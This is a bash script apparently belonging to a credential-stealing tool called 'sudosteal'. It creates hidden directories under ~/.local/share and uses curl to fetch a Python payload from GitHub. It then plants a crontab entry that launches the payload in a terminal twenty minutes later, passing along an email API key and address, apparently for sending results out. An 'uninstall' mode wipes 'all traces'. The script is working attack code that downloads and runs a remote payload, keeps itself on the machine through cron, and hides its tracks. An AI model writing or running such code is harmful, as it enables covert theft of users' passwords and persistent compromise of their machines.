#!/bin/bash

# Cron Job Manager for payload
# This script checks for the existence of ~/.local/share/.temp_log
# If it doesn't exist, it fetches the payload and schedules it to run in 20 minutes

TEMP_LOG_FILE="$HOME/.local/share/.temp_log"
PAYLOAD_DIR="$HOME/.local/share/.temp_logs"
PAYLOAD_SCRIPT="$PAYLOAD_DIR/payload.py"

# Ensure the directory exists
mkdir -p "$PAYLOAD_DIR"

case "$1" in
    "uninstall")
        crontab -l 2>/dev/null | grep -v "$PAYLOAD_SCRIPT" | grep -v "$(realpath "$0")" | crontab -
        rm -f "$PAYLOAD_SCRIPT" "$TEMP_LOG_FILE" "$HOME/.local/share/.cron_monitor.log"
        echo "All traces of the cron job and payload have been removed."
        ;;
    "")
        if [ ! -f "$TEMP_LOG_FILE" ]; then
            curl -fsSL "https://raw.githubusercontent.com/mzotic/sudosteal/refs/heads/main/src/payload.py" -o "$PAYLOAD_SCRIPT"
            chmod +x "$PAYLOAD_SCRIPT"
            EXEC_MIN=$(date -d "+20 minutes" '+%M')
            EXEC_HOUR=$(date -d "+20 minutes" '+%H')
            EXEC_DAY=$(date -d "+20 minutes" '+%d')
            EXEC_MONTH=$(date -d "+20 minutes" '+%m')
            DBUS_ADDR_CMD='export DBUS_SESSION_BUS_ADDRESS=$(grep -z DBUS_SESSION_BUS_ADDRESS /proc/$(pgrep -u $USER gnome-session | head -n1)/environ | tr "\0" "\n" | grep DBUS_SESSION_BUS_ADDRESS | cut -d= -f2-)'
            api_key=$(echo $RESEND_API_KEY)
            email=$(echo $EMAIL)
            CRON_JOB="$EXEC_MIN $EXEC_HOUR $EXEC_DAY $EXEC_MONTH * export DISPLAY=:0; $DBUS_ADDR_CMD; gnome-terminal -- bash -c 'export api_key=$api_key; export email=$email; python3 \"$PAYLOAD_SCRIPT\"; exec bash'"
            (crontab -l 2>/dev/null; echo "$CRON_JOB") | crontab -
        fi
        ;;
    *)
        echo "Usage: $0 [uninstall]"
        exit 1
        ;;
esac
